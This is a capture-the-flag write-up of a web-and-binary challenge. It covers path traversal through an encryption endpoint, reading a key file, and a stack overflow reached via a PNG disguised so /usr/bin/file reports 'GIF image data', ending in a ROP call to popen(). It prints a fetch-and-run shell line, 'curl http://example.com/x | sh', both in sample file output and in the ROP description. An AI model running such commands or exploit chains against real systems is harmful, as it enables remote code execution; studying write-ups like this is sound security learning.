## gif uploader – Pwnable Challenge

gif uploader was more of a "variety" challenge than just a pwnable.

### Stage 1: Reading files.

Gif uploader starts as a bit of a web and crypto challenge. We're provided with a `__main__.py` file that implements an encryption routine, and the address of a website that prompts you to upload a gif, and then allows for performing some tasks on them: view, share, encrypt, and a weird "Get Red/Green/Blue from Image" option that will come up later.

The "encrypt" option on the website leads to `http://13.125.6.142/encrypt.php?a=<sha1 of connecting ip address>/image`, which contains a base64 blob (this is in fact the output of `__main__.py` on the uploaded image). By trying paths like `?a=../../../../etc/passwd`, we noticed that being able to reverse the encryption would let us dump files off the server.

The encryption routine in `__main__.py` uses a server-side key, that it fetches with `chdir("/var/www/html/"); A=open("key","rb").read().strip()`. We could simply download this file at `http://13.125.6.142/key`, which was necessary in implementing a decryption routine.

Our decryption routine is attached in `decrypt_files.py`. We used it to fetch the php source of the web application.

### Stage 2: Pwning the binary.

We used this encrypt.php file read to download the source of the web application. The source was not interesting, except that the "Get Red/Green/Blue from Image" was implemented with a helper binary `/server`. We downloaded this binary via encrypt.php as well. The decompiled source of this binary is attached in `server.c`.

This server binary does the following:

1. Checks that /usr/bin/file contains "GIF image data" (and aborts if it doesn't).
2. Opens the file as a GIF, PNG, JPEG, or BMP; whatever works.
3. Stack overflows with the image data, if the image is really wide (over 65792 pixels).

Unfortunately, the width of a GIF image is limited to too small a number of pixels for the overflow to occur. However, the uploaded image file doesn't really need to be a GIF. All we need is to control the output of /usr/bin/file to contain the above string.

We first tried JPEGs with EXIF metadata, which is quite easy to control to contain arbitrary strings which /usr/bin/file will print out. Unfortunately, JPEGs are also limited in width.

We ended up using PNG files (which can be wide enough), and modified them to trick /usr/bin/file to recognize them as Linux swap files. File allows for a controlled "LABEL" string to be printed out for swap files, so we put "GIF image data" in there (along with a connect-back shell script that our exploit needed).

```
# Example of what one of our modified PNGs looks like to file.
$ /usr/bin/file /tmp/test.png
/tmp/test.png: Linux/i386 swap file (new style), version 707406378 (4K pages), size 707406378 pages, LABEL= ; curl http://example.com/x | sh; GIF image data, UUID=2a2a2a2a-2a2a-2a2a-2a2a-2a2a2a2a2a2a
```

The actual memory-corruption part of the exploit is fairly straightforward. The binary is non-PIE and has no stack canaries, so the stack overflow grants us unconstrained ROP. Even though the exploit is non-interactive and ASLR prevents us from using libc, the binary contains a plt entry to `popen()` (because of how it invokes /usr/bin/file). And thanks to binary saving output from the /usr/bin/file call into the .data section, we were able to place `curl http://example.com/x | sh` at a fixed location in the binary. Simply calling `popen()` on this string gives us shell script execution on the target machine.

The script to generate a PNG containing the ROP chain, as well as to modify it to trick /usr/bin/file, is attached as `generate_gif.py`.
